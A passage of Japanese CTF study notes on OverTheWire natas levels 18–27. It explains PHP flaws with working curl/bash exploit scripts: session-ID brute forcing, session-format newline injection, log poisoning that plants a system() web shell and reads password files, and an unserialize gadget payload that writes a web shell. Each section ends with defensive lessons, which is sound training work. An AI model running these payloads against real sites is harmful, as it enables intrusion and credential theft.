で一旦強制的に抜け出し，コマンド全体を見直して，`"`が必ず**開いた分だけ閉じられているか**を数え直してから再実行する．

---

## セッションIDの空間が狭い/推測可能だと，ログインせずに他人のセッションへなりすませる

ログインフォームの認証ロジック自体が無効化されていても（例: 管理者判定の関数が常に`0`を返すよう改変されている），サーバー側が**セッションIDをクライアントが送ってきたCookieの値だけで受け入れてしまう**設計だと，別の抜け道が生まれる．

```php
function createID($user) {
    global $maxid; // $maxid = 640
    return rand(1, $maxid);
}
...
if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    // isValidID()の中身はis_numeric($id)だけ
    if(!session_start()) { ... }
}
```

ここでのポイントは2つ．

- **セッションIDの空間が極端に狭い**（`1〜640`の数字だけ．ランダムとはいえ640通りしかない）
- **`PHPSESSID`Cookieの値を，正当な手段でもらったものかどうか検証せず，そのまま`session_start()`に使ってしまう**（`is_numeric`かどうかしかチェックしていない）

この2つが揃うと，「フォームでログインして自分のセッションを作る」のではなく，「**既に存在している640通りのセッションIDのどれかに，たまたま欲しい状態（今回は`admin=1`）が入っていないか，Cookieを差し替えながら総当たりする**」という攻撃が成立してしまう．ログイン処理そのものを一切通らずに，他人（または過去のセッション）に成りすませてしまうのがこの脆弱性の怖いところ．

**実際に使ったスクリプト（natas18→natas19）**

```bash
#!/bin/bash
USER=natas18
PASS=パスワード
URL="http://natas18.natas.labs.overthewire.org"
MaxId=640

for id in $(seq 1 $MaxId); do
    response=$(curl -s -u "$USER:$PASS" -b 'PHPSESSID='$id $URL)
    if echo "$response" | grep -q "You are an admin"; then
        echo "Found admin session ID: $id"
        break
    fi
done
```

見つかったIDを使って，もう一度同じCookieでページを取得すれば，管理者向けの内容（次のレベルの認証情報）が表示される．

```bash
curl -s -u natas18:パスワード -b "PHPSESSID=見つかったID" "http://natas18.natas.labs.overthewire.org/"
```

**教訓**:
- 「ログインの判定ロジックが安全か」だけでなく，「**そもそもセッションIDがどう発行され，どう検証されているか**」も別のチェックポイントとして見る．認証ロジックが完璧でも，セッション管理がザルなら意味がない．
- セッションIDの空間が小さい（推測・総当たり可能）ことと，クライアント指定のIDをそのまま信用してしまうことが組み合わさると，ログイン処理を経由せずに他のセッションに成りすませてしまう．
- `<<<`（ヒアストリング）: `command <<< "$var"`は`echo "$var" | command`とほぼ同じ効果だが，`echo`という別プロセスを起動せずにシェルが直接標準入力へ変数の中身を渡してくれる書き方．

---

## セッションIDが「連番」でなくなっても，中身の構造を読めば同じ攻撃が通じる（natas18→19）

natas19はnatas18とほぼ同じ仕組みだが，`PHPSESSID`の作り方が変わっている．

```php
function myhex2bin($h) {
    // 16進数文字列 → 元の文字列 に戻す(natas16のxxd -r -pと同じ発想)
    $r = '';
    for ($a=0; $a<strlen($h); $a+=2) { $r .= chr(hexdec($h[$a].$h[$a+1])); }
    return $r;
}

function isValidID($id) {
    if($id != strtolower($id)) return false;           // 小文字でなければNG
    $decoded = myhex2bin($id);                          // 16進→元の文字列
    if(preg_match('/^(?P<id>\d+)-(?P<name>\w+)$/', $decoded, $matches)) {
        return true;                                     // "数字-単語" の形になっているか
    }
    return false;
}

function createID($user) {
    global $maxid; // 640
    $idnum = rand(1, $maxid);      // 中身の乱数の範囲はnatas18と全く同じ(1〜640)
    $idstr = "$idnum-$user";       // 例: "281-admin"
    return bin2hex($idstr);        // これを16進エンコードしたものがCookieの値
}
```

`isValidID()`は「Cookieの値が，デコードすると`数字-単語`の形になっているか」という**フォーマット**をチェックしているだけで，PHPが実際にセッションファイルを探すときのキーは，**デコードする前の生のCookie文字列そのもの**．つまり「見た目が複雑になった」だけで，中に埋め込まれた乱数の範囲（1〜640）はnatas18と変わっていない．

すでに存在している(admin=1になっている)セッションに辿り着くには，そのセッションが作られたときと**まったく同じ文字列**（番号＋ユーザー名）を再現してCookieに使う必要がある．番号は総当たり（1〜640）できるが，ユーザー名は本来無限にあり得るので，何か絞り込む手がかりが必要になる．

そのヒントは，同じソース内の`isValidAdminLogin()`にある．

```php
function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
        // return 1;  ← 無効化されているが，"admin"というユーザー名が特別扱いされてきた痕跡
    }
    return 0;
}
```

このアプリの中で唯一「特別なユーザー名」として扱われているのが`"admin"`．なので，ユーザー名部分は`"admin"`だろうと推測し，`"番号-admin"`という文字列を作って16進エンコードし，Cookieとして総当たりする．

```bash
echo -n "119-admin" | xxd -p    # 文字列 → 16進(natas16のxxd -r -pの逆方向)
```

**実際に使ったスクリプト（natas19→natas20）**

```bash
#!/bin/bash
USER=natas19
PASS=パスワード
URL="http://natas19.natas.labs.overthewire.org"
MaxId=640

for id in $(seq 1 $MaxId); do
    key="${id}-admin"
    keystream=$(echo -n "$key" | xxd -p | tr -d '\n')
    response=$(curl -s -u "$USER:$PASS" -b 'PHPSESSID='$keystream $URL)
    if echo "$response" | grep -q "You are an admin"; then
        echo "Found admin session ID: $id"
        break
    fi
done
```

見つかった番号で改めてCookieを組み立てて取得すれば，次のレベルの認証情報が見られる．

```bash
key="見つかった番号-admin"
keystream=$(echo -n "$key" | xxd -p | tr -d '\n')
curl -s -u natas19:パスワード -b "PHPSESSID=$keystream" "http://natas19.natas.labs.overthewire.org/"
```

**教訓**:
- セッションIDの「見た目」が複雑（16進エンコードされている等）になっても，実際にランダムに選ばれている部分の**範囲そのものが狭ければ**，本質的な脆弱性は変わらない．難読化と，本当の意味でのエントロピー（推測しにくさ）は別物．
- 検証ロジック（`isValidID`）が中身のフォーマットしかチェックしていない場合，PHPが実際にセッションを引き当てるキーは**クライアントが送ってきた生の値そのもの**である，という点を忘れない．
- 無効化された（コメントアウトされた）ロジックの中にも，「このアプリがどんな文字列を特別視してきたか」という設計上のヒントが残っていることがある．
- `xxd -p`（引数なし，`-r`なし）は「文字列→16進」，`xxd -r -p`は「16進→文字列」．方向を混同しないこと．また，`xxd`にファイル名ではなく変数の中身を渡したいときは，`echo -n "$var" | xxd -p`のように標準入力経由で渡す．
- `echo -n`の`-n`は「末尾に自動でつく改行を付けない」という意味．エンコード/デコードする文字列に余計な改行が混ざると，サーバー側の正規表現マッチ（`\w+$`など）が失敗する原因になる．

---

## 独自実装のセッション保存フォーマットに，区切り文字（改行）を注入する（natas19→20）

`session_set_save_handler()`を使って，セッションの読み書きを自前の関数（`myread`/`mywrite`）に置き換えているアプリがある．PHP標準のシリアライズを使わず，こういう素朴な独自フォーマットで保存している場合，注意が必要．

```php
function mywrite($sid, $data) {
    foreach($_SESSION as $key => $value) {
        $data .= "$key $value\n";   // "キー 値" を改行区切りで並べる
    }
    file_put_contents($filename, $data);
}

function myread($sid) {
    ...
    foreach(explode("\n", $data) as $line) {      // 改行で1行ずつに分割
        $parts = explode(" ", $line, 2);          // 最初の空白でキーと値に分割
        if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
}
```

保存フォーマットが「1行1エントリ，`キー 値`,区切りは改行と空白」という**プレーンテキスト**になっている．ここで，ユーザーが自由に値を設定できるキー（例: `$_SESSION["name"] = $_REQUEST["name"]`）があり，かつ**値の中の改行や空白がエスケープ/検証されずにそのまま保存される**場合，値の中に区切り文字そのもの（改行）を紛れ込ませることで，**存在しないはずの別のキーを勝手に追加**できてしまう．

```
name パラメータに "hoge\nadmin 1" を送る
→ $_SESSION["name"] = "hoge\nadmin 1" (1キーのつもり)
→ mywriteが書き込むファイルの中身:
   name hoge
   admin 1
→ 次にmyreadがこれをパースすると...
   $_SESSION["name"]  = "hoge"
   $_SESSION["admin"] = "1"   ← 勝手に増えた
```

**実践手順**

bashで文字列の中に本物の改行文字を埋め込むには，`$'...'`（ANSI-Cクォーティング）を使う．

```bash
name=$'hoge\nadmin 1'
```

これを`--data-urlencode`で送れば，改行は自動的に`%0A`として安全にエンコードされる．

```bash
curl -s -c cookies.txt -u ユーザー:パスワード -G --data-urlencode "name=$name" "URL" > /dev/null
```

**重要な注意点**: この1回目のリクエストの中では，まだadmin判定は通らない．理由は処理の順番にある．

```php
session_start();                          // ← 今回のリクエスト開始時点の(細工前の)セッションを読み込む
$_SESSION["name"] = $_REQUEST["name"];    // ← ここで初めて細工した値をメモリ上にセット
print_credentials();                      // ← 読み込んだ(まだ古い)$_SESSIONをチェック
```

毒入りの行が実際にファイルに書き込まれるのは，スクリプトの実行が終わってセッションが閉じられるとき．なので，**同じセッションのまま，もう一度リクエストを送り直す**ことで，今度は`session_start()`が毒入りファイルを読み込み，`$_SESSION["admin"]`が最初からセットされた状態になる．

```bash
curl -s -b cookies.txt -u ユーザー:パスワード "URL"
```

- `-c cookies.txt`: レスポンスのCookie(新規発行されたPHPSESSID)をファイルに保存
- `-b cookies.txt`: そのファイルのCookieを次のリクエストで送る

**教訓**:
- 独自のシリアライズ/保存フォーマットを実装する場合，区切り文字（改行，スペースなど）として使っている文字が，**値の中に紛れ込んでいないか**を必ず検証する必要がある．検証を怠ると，値のつもりが構造（別のキー）として解釈されてしまう，いわゆる「インジェクション」系の脆弱性になる．
- 効果が反映されるタイミングにも注意する．`session_start()`は「リクエストの最初」に読み込むだけなので，同じリクエスト内で書き換えた内容はそのリクエストの判定には反映されない．「保存 → 読み直し」の2ステップが必要な脆弱性もある．
- `$'...'`（ANSI-Cクォーティング）: bash内で`\n`や`\t`などのエスケープシーケンスを，本物の制御文字に変換してくれる文字列リテラルの書き方．
- `curl -c file` / `-b file`: Cookie jar機能．`-c`でレスポンスのCookieを保存し，`-b`で次のリクエストに読み込ませることで，複数リクエストにまたがってセッションを維持できる．

---

## 「colocated（同じ場所に置かれている）」な別アプリと，セッションストレージを共有してしまう（natas21）

同じサーバー上に，本体アプリ（`natas21`）とは別に，緩いバリデーションの「実験用」アプリ（`natas21-experimenter`）が同居している，というケース．

本体側は，`$_SESSION["admin"] == 1`を見るだけで，それをセットする手段がどこにもない．

```php
session_start();
print_credentials();  // $_SESSION["admin"]==1 かどうかだけ見る
```

一方，experimenter側には，見た目は「CSSのスタイルを試せるだけの，人畜無害なフォーム」があるが，中身を見ると，書き込み処理に**キーのホワイトリストチェックが抜けている**．

```php
// 許可されているのはalign/fontsize/bgcolorのはずなのに...
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;   // ← ここにはチェックが一切ない．どんなキーでも書き込める
    }
}
// ホワイトリスト($validkeys)が使われているのは,表示用のデフォルト値決定だけ
```

この2つのアプリが，**サーバー内部では同じセッション保存場所（同じ`session_save_path()`）を共有している**（＝「colocated」）と，本体側で読まれる`$_SESSION`を，緩い方のアプリ経由で間接的に書き換えられてしまう．

**実践手順**

1. experimenter側に，ホワイトリストにない`admin=1`を紛れ込ませてPOSTし，新しく発行されたセッションのCookieを保存する

```bash
curl -s -c cookie.txt -u ユーザー:パスワード \
  --data-urlencode "submit=1" --data-urlencode "admin=1" \
  "http://natas21-experimenter.natas.labs.overthewire.org/index.php"
```

2. **同じ`PHPSESSID`の値**を，今度は本体（`natas21`）へのリクエストに手動で指定する

```bash
curl -s -b "PHPSESSID=$SESSID" -u ユーザー:パスワード "http://natas21.natas.labs.overthewire.org/"
```

**ハマりどころ: `natas21`と`natas21-experimenter`は別ホスト（別ドメイン）である**

サーバー内部ではセッションファイルの保存場所を共有していても，Cookieの仕組みの上では**別ホストとして扱われる**．`curl`の`-c`/`-b`によるCookie jarの自動管理に任せると，ドメインが一致しないため，発行されたCookieが自動的には次のホストへ送られない．なので，`-b "PHPSESSID=値"`のように**値を直接指定して手動で使い回す**必要がある．

このとき，`-b`に渡す文字列に`=`が含まれていないと（例: 値だけをそのまま渡してしまうと），curlはそれを「Cookie の値」ではなく「**Cookieを読み込むファイル名**」だと解釈してしまうので注意（`-b "PHPSESSID=値"`のように，必ずキー名付きで渡す）．

**教訓**:
- 「ホワイトリストでチェックしています」と言っても，それが**読み込み側だけ**で，書き込み側でチェックされていなければ意味がない．チェックが「どちらの方向」に効いているのか，必ず両方確認する．
- 一見無害に見える別のミニアプリでも，**同じセッションストレージを共有している**なら，そちらの脆弱性が本体の認証状態に直結する．「このアプリ単体は安全か」だけでなく，「同じ基盤（セッション・DB・ファイルシステムなど）を共有している他のアプリはどうか」も攻撃対象として考える．
- ランダムな長い文字列を手作業でコピー＆ペーストするのは間違いのもと．`awk`やシェル変数を使って，コマンドの出力から直接取り出すようにすると事故を防げる．

---

## `header("Location: ...")`だけではスクリプトは止まらない（natas22）

「条件を満たさなければリダイレクトする」という，一見ちゃんとしたアクセス制御に見えるコード．

```php
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
        header("Location: /");
    }
}
```

`header("Location: /")`は，**「ブラウザに次はこっちへ行ってね」と伝えるレスポンスヘッダーを送るだけ**の関数で，PHPスクリプト自体の実行を止める効果はない．`exit;`や`die;`を直後に書き忘れると，リダイレクトを指示した後も，**残りのコードはそのまま実行され続けてしまう**．

```php
if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    ...
}
```

このコードは，adminかどうかの判定結果に関係なく，`revelio`というGETパラメータさえ付いていれば**必ず実行される**．

なぜこれが実際の脆弱性になるかというと，**普通のブラウザはリダイレクトヘッダーを見た瞬間に自動でジャンプしてしまう**ので，リダイレクト後に本来隠したかったはずの中身が生成されていたことに，人間は気づけない．しかし，`curl`のようなツールは，`-L`を付けない限り**リダイレクトを自動では追いかけず，レスポンス本体をそのまま表示してくれる**ので，隠したつもりの中身がそのまま見えてしまう．

```bash
curl -s -u natas22:パスワード "http://natas22.natas.labs.overthewire.org/index.php?revelio"
```

これだけで，リダイレクトを無視して中身を直接見ることができる．

**教訓**:
- `header("Location: ...")`を使ったアクセス制御は，直後に`exit;`（または`die;`）を書かないと**「見た目上リダイレクトするだけ」で，実際には後続の処理を止められていない**危険なコードになる．PHPに限らず，「レスポンスを送る」ことと「処理を止める」ことは別の操作，という原則は他の言語でも共通して意識する必要がある．
- クライアント（ブラウザ）が親切にリダイレクトを追いかけてくれることに，サーバー側のセキュリティを依存させてはいけない．`curl`のような「言われた通りに動くとは限らないクライアント」から見れば，リダイレクトは単なる「ヒント」でしかなく，強制力はない．

---

## PHPの緩い比較（型のジャグリング）で，一見矛盾した条件を同時に満たす（natas23）

```php
if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
```

一見，「`"iloveyou"`という文字列を含んでいて，かつ10より大きい数値」という，両立しなさそうな条件．ポイントは，HTTPパラメータとして送られてくる`$_REQUEST["passwd"]`は**必ず文字列型**であり，それを`>`で数値と比較するとき，PHP（8より前のバージョン）は次のルールで型変換（型のジャグリング）を行う，というところ．

- 文字列全体が数値として解釈できる（例: `"123"`）→ そのまま数値として比較
- **数字から始まり，途中から数字以外の文字が混ざる**（例: `"123abc"`）→ **先頭の数字部分だけ**を取り出して数値として比較（`123`として扱われる）
- 数字以外の文字から始まる（例: `"abc123"`）→ 数値として解釈できないので`0`として扱われる

これを利用して，`"12iloveyou"`のような**数字で始まり，そのあとに目的の文字列が続く**値を作ると，

- `strstr("12iloveyou", "iloveyou")` → 文字列としては`"iloveyou"`を含むので`true`
- `"12iloveyou" > 10` → 先頭の`12`だけが数値として取り出され，`12 > 10`で`true`

の両方が同時に成立してしまう．

```bash
curl -s -u natas23:パスワード -G --data-urlencode "passwd=12iloveyou" "http://natas23.natas.labs.overthewire.org/"
```

**教訓**:
- PHPの`==`や`>`のような**緩い比較（loose comparison）**は，文字列と数値を比較するときに，見た目では予想しづらい型変換を行う．「文字列に見えるから安全」とは限らない．
- 特に「数字で始まって，途中から文字列が混ざる」形の入力は，比較時に**先頭の数値部分だけが評価対象になる**という挙動を悪用されやすい．ユーザー入力を数値として扱いたいときは，`is_numeric()`で事前に検証したり，`===`（型まで比較する厳密比較）を使うなど，型を曖昧にしない書き方が重要．
- この挙動はPHPのバージョンによって変わる（PHP8で比較ルールが変更された）ので，同じコードでもPHPのバージョン次第で結果が変わりうる，という点も覚えておく．

---

## `strcmp()`に配列を渡して比較そのものを壊す（natas24）

```php
if(!strcmp($_REQUEST["passwd"],"<censored>")){
```

`strcmp()`は「文字列」を2つ受け取って比較する関数．一致していれば`0`を返し，`!0`で`true`になる，という普通のロジックに見える．

ここでの攻撃ポイントは，パスワードを当てることではなく，**`strcmp`が想定していない型（配列）を渡して，比較そのものを破綻させる**こと．HTTPパラメータは，名前の後ろに`[]`を付けて送ると，PHP側で**配列として**受け取れる．

```
passwd=abc     → $_REQUEST["passwd"] は文字列 "abc"
passwd[]=abc   → $_REQUEST["passwd"] は配列 ["abc"]
```

`strcmp()`に文字列の代わりに配列を渡すと，このPHPのバージョンでは警告を出しつつ`NULL`を返す．PHPでは`NULL`は`false`相当なので，`!NULL`は`true`と評価され，**本物のパスワードを知らなくても`if`文が真になってしまう**．

```bash
curl -s -u natas24:パスワード -G --data-urlencode "passwd[]=x" "http://natas24.natas.labs.overthewire.org/"
```

**教訓**:
- 「型」の話は，値そのもの（`"123"`のような数字っぽい文字列）だけでなく，「**単一の値か，配列か**」という**構造**のレベルでも起こりうる．HTTPパラメータは`名前[]=`という書き方だけで，サーバー側の関数に想定外の型（配列）を渡せてしまう．
- 比較・検証用の関数（`strcmp`，`strstr`など文字列処理関数全般）に，型チェックなしでユーザー入力をそのまま渡すと，関数が「想定外の型を渡されたときの挙動（警告＋`NULL`を返す，など）」を悪用されて，検証そのものを迂回されることがある．型が保証されない入力を扱うときは，`is_string()`などで事前にチェックする習慣が重要．
- HTTPパラメータの値は常に文字列（またはその配列）であり，PHP以外の言語で書かれたAPIでも「入力の型は自分で決められるものではなく，相手（クライアント）が決められる」という前提でコードを書く必要がある．

---

## LFI（ローカルファイルインクルード）＋ ログポイズニングで任意コード実行（natas25）

```php
function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }
    return 0;
}
```

`$_REQUEST["lang"]`を`"language/" . $_REQUEST["lang"]`という形でそのまま`include()`しているLFI（Local File Inclusion）．対策として`"../"`を1回だけ`str_replace`で除去しているが，これは非再帰的なので，`"....//"`（ドット4つ＋スラッシュ2つ）を送ると，除去後に`"../"`が1つ再構成されてしまう（詳しい理屈は上の`dquote>`の少し前，natas19近辺の`str_replace`バイパスの節と同じ原理）．

ただし，`"natas_webpass"`という文字列がパスに含まれていると即座に`exit`されるので，パスワードファイルを**直接**指定することはできない．そこで，`include()`が「ファイルの中身をPHPコードとして実行する」という性質を利用し，**自分でPHPコードを書き込める別の場所を用意して，そこをincludeさせる**．

このアプリには，`logRequest()`という関数があり，リクエストのたびに`$_SERVER['HTTP_USER_AGENT']`（`User-Agent`ヘッダー）を，`session_id()`にひもづいたログファイル（`/var/www/natas/natas25/logs/natas25_<セッションID>.log`）にそのまま書き込んでいる．`User-Agent`は`curl -A`で完全に自由な文字列に書き換えられるので，ここにPHPコードを仕込み，そのログファイル自体をLFIでincludeさせれば，仕込んだコードが実行される（**ログポイズニング**）．

**手順**

1. `User-Agent`にPHPコードを仕込みつつ，`lang`に`"../"`を含めて`logRequest()`を発火させる（これでログファイルに1行追記される）
2. `lang=....//logs/natas25_<セッションID>.log`で，そのログファイル自体をincludeさせる（仕込んだPHPコードが実行される）

```bash
# 1. ログに仕込む
curl -s -u natas25:パスワード \
  -b "PHPSESSID=一意なID" \
  -A '<?php system($_GET["cmd"]); ?>' \
  -G --data-urlencode "lang=../" \
  "http://natas25.natas.labs.overthewire.org/" > /dev/null

# 2. 仕込んだログをincludeさせて実行する
curl -s -u natas25:パスワード \
  -b "PHPSESSID=一意なID" \
  -G --data-urlencode "lang=....//logs/natas25_一意なID.log" \
  --data-urlencode "cmd=cat /etc/natas_webpass/natas26" \
  "http://natas25.natas.labs.overthewire.org/"
```

`safeinclude()`の`natas_webpass`チェックは**includeするファイルパス（`$filename`）に対してだけ**行われるものなので，`cmd`パラメータの中身（実行するコマンド文字列）にそのまま`/etc/natas_webpass/...`と書いても問題ない．

**ハマりどころ: セッションIDは，他の受講者と被らない一意な文字列にする**

このサーバーは多くの受講者が同時に攻略している共有環境で，`hackme`のような予測しやすいセッションIDは，**既に他の誰かが同じ発想で使ってしまっていて，ログファイルの中身が自分の書き込みと無関係な内容で埋まっている**ことがある．`openssl rand -hex 8`などで十分にランダムなIDを生成し，1回目と2回目で必ず同じ値を使う．

**教訓**:
- 「危険な文字列（`natas_webpass`）を含むファイルパスは拒否する」というチェックがあっても，`include()`は指定されたファイルの**中身をコードとして実行する**という性質があるので，**攻撃者が中身を制御できる別の場所（今回はログファイル）を経由すれば，直接パスワードファイルを指定しなくてもパスワードを読み出せてしまう**．入力検証は「どのパスを直接指定できるか」だけでなく，「間接的にコード実行につながる経路がないか」まで考える必要がある．
- `User-Agent`やCookie，Refererなど，アプリが「ログ用」として何気なく記録しているHTTPヘッダーは，**攻撃者が完全に自由に指定できる入力**でもある．ログに書き込む値をエスケープ・検証せず，かつそのログファイルが（直接または間接的に）実行され得る場所にあると，ログポイズニングという形でコード実行につながる．
- 共有のCTF環境では，「自分専用のはずの識別子（セッションIDなど）」が，デフォルト値や連番だと簡単に他人と衝突する．テストのたびに，衝突しにくい十分ランダムな値を使う習慣をつける．

---

## PHPオブジェクトインジェクション（unserialize）＋マジックメソッド悪用（natas26）

```php
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

Cookie（`drawing`）という，攻撃者が完全に自由に書き換えられる値を，そのまま`unserialize()`に渡している．

**なぜ`unserialize()`への信頼できない入力が危険か**

`serialize()`／`unserialize()`は配列だけでなく，**PHPオブジェクトそのもの**（クラス名とプロパティの値）を文字列化・復元できる．`unserialize()`に渡す文字列を攻撃者が制御できると，攻撃者は「どのクラスの，どんなプロパティ値を持つオブジェクトを作るか」まで指定できてしまう（**PHP Object Injection**）．

さらに，PHPのオブジェクトには**マジックメソッド**（`__destruct()`，`__wakeup()`，`__toString()`など）があり，特定のタイミングで**自動的に**呼ばれる．`unserialize()`で複製したオブジェクトでもこれは変わらない．つまり，「攻撃者が中身を自由に決めたオブジェクトを作らせる → そのクラスのマジックメソッドが自動発火する → その中の処理が攻撃者の思い通りの引数で実行される」という流れが成立すれば，直接コードを実行しなくても，既存クラスの挙動を「悪用（gadget化）」できる．

**今回のgadget: `Logger`クラス**

```php
class Logger{
    private $logFile;
    private $exitMsg;
    // ...
    function __destruct(){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}
```

`__destruct()`は，オブジェクトが破棄される時（スクリプト終了時を含む）に自動で呼ばれ，`$this->logFile`というパスに`$this->exitMsg`をそのまま書き込む．通常はコンストラクタ経由で`logFile`は`/tmp/natas26_◯◯.log`に固定され，`exitMsg`も固定文字列になるが，**`unserialize()`はコンストラクタを一切呼ばない**．シリアライズ文字列に書かれた値がそのままプロパティにセットされるので，`logFile`と`exitMsg`を攻撃者が完全に自由な値にできる．

**攻撃**: `logFile`をWebから直接アクセスできる場所（例：`img/`ディレクトリ配下）にし，`exitMsg`を`<?php system($_GET["cmd"]); ?>`のような簡易Webシェルにしたオブジェクトを`unserialize()`させれば，スクリプト終了時の`__destruct()`で，狙った場所にWebシェルが書き込まれる．

**技術的な壁: privateプロパティのシリアライズ形式**

`logFile`や`exitMsg`は`private`なので，`serialize()`は`\0クラス名\0プロパティ名`という**nullバイトを含む特殊な名前**でシリアライズ文字列に埋め込む．手でこの文字列を組み立てるとnullバイトの扱いを間違えやすく，`unserialize()`に壊れた文字列として拒否されがちになる．

確実な回避方法は，**PHP自身に正しい形式でシリアライズさせる**こと．`ReflectionClass`で対象クラスの`private`プロパティに直接アクセスして値をセットしてから`serialize()`すればよい．

```php
class Logger{ private $logFile; private $initMsg; private $exitMsg; }

$obj = new Logger();
$ref = new ReflectionClass($obj);

$ref->getProperty("logFile")->setValue($obj, "img/xxxx.php");
$ref->getProperty("exitMsg")->setValue($obj, '<?php system($_GET["cmd"]); ?>');

echo base64_encode(serialize($obj));
```

（PHP 8.1以降は，`ReflectionProperty`で`private`プロパティに直接アクセスする際の`setAccessible(true)`が不要になっている．呼んでも動作はするが非推奨警告が出るだけなので省略してよい．）

**補足: 途中でFatal Errorが起きても`__destruct()`は実行される**

Webシェル設置後，アプリ側の`storeData()`で`$drawing[]=$new_object;`が実行されるが，`unserialize()`した`$drawing`は配列ではなく`Logger`オブジェクトなので，ここで型エラー（Fatal Error）になる．それでも問題ないのは，**PHPはスクリプトがエラーで終了する場合でも，その時点で生きているオブジェクトのデストラクタはきちんと呼び出す**ため．

**ハマりどころ: Webシェルのファイル名も，他の受講者と衝突する**

natas25のセッションID衝突と同じ理由で，`img/shell.php`のような**誰もが思いつきやすい固定のファイル名**を使うと，同時に攻略中の他の受講者が同じ名前で別のWebシェルを書き込み，お互いに上書きし合ってしまう．一度は自分の仕込んだ`system($_GET["cmd"])`の結果が返ってきても，しばらくすると別仕様の（`$_GET['c']`のような）他人のシェルに上書きされ，予期しないエラーが出るようになる．ファイル名は`openssl rand -hex 8`などで毎回ランダムに変えることで回避できる．

**教訓**:
- 信頼できない入力を`unserialize()`に渡してはいけない．攻撃者は「クラス名とプロパティ値を自由に指定したオブジェクト」を作れてしまい，そのクラスに`__destruct()`や`__wakeup()`などのマジックメソッド（gadget）が存在すれば，コードを直接実行せずとも危険な処理を自動発火させられる．
- `unserialize()`はコンストラクタを呼ばない．コンストラクタでどれだけ値を検証・固定していても，`unserialize()`経由ならその検証は一切効かない．
- privateプロパティを含むペイロードを外部から手組みするのは事故のもとなので，`ReflectionClass`を使って対象言語自身に正しい形式で生成させるのが安全．
- 共有のCTF環境では，セッションIDだけでなく，**攻撃者が書き込むファイル名も**予測しやすいものにすると他人と衝突する．常にランダムな値を使う．

---

## （未解決・学びのメモ）MySQL VARCHARの末尾スペース無視比較を狙った攻撃（natas27）

natas27は，`username`／`password`を`mysqli_real_escape_string()`で適切にエスケープしているため，古典的なクォート注入は通用しない．代わりに，歴史的には以下のテクニックが知られている（2014〜2020年ごろの複数の独立したwriteupで確認）．

**理論**：MySQLの文字列比較（`=`）は，`CHAR`/`VARCHAR`型において**末尾のスペースを無視する**（`'natas28' = 'natas28   '`がTRUEになる）という仕様（PAD SPACE比較）がある．

アプリ側には，こんなチェックがある．

```php
function createUser($link, $usr, $pass){
    if($usr != trim($usr)) {           // 前後の空白があると弾く
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));  // 先頭64文字だけDB保存
    ...
```

このチェックは，`"natas28"＋スペース57個＋空白以外の1文字`（合計65文字）という入力なら回避できる．`trim()`は先頭・末尾が空白でない限り何もしないので通過し，`substr(...,0,64)`で末尾の1文字だけが切り捨てられ，DBには`"natas28"`＋スペース57個（＝64文字）という値が保存される．

理論上は，これで「`natas28`という名前に，MySQL的には等しいが別の行」を自分の知っているパスワードで作成でき，`username=natas28`（スペースなし）でログインすると，`checkCredentials()`は自分の行にマッチしてログインが成立し，`dumpData()`は（パスワード条件を含まない`WHERE username='natas28'`なので）本物の`natas28`行の中身を返す可能性がある，という流れになる．

**実際に試した結果（このセッションでの検証）**：上記の手順を，パスワードを変えながら複数回（`hogehoge123`，`123`，空文字）試したが，**すべて`Wrong password`のままで，一度も成功しなかった**．natas28と無関係な自分専用のusernameで同じ仕組みだけを切り分けて検証しても，同様に末尾スペース無視比較は再現しなかった．

**教訓**：
- 攻撃ロジック自体の組み立て方（`trim()`チェックのすり抜け方，`substr()`切り詰めの悪用）は，複数の独立した公開writeupと完全に一致しており，発想としては正しかった．
- しかし，攻撃の前提となる「MySQLの末尾スペース無視比較」という**DBエンジン側の挙動**は，現在のnatas27本番サーバーでは再現しなかった．長期運用されているCTF基盤では，MySQL/MariaDBのバージョンアップ等により，過去のwriteupが前提としていたDBの挙動が変わっていることがある．
- **古いwriteupに書かれた手順を鵜呑みにせず，自分の手で実際に検証する**ことが重要．理屈が合っていても，環境側の前提が崩れていれば通用しない．これは実務のペネトレーションテストでも同様に起こりうる．

---
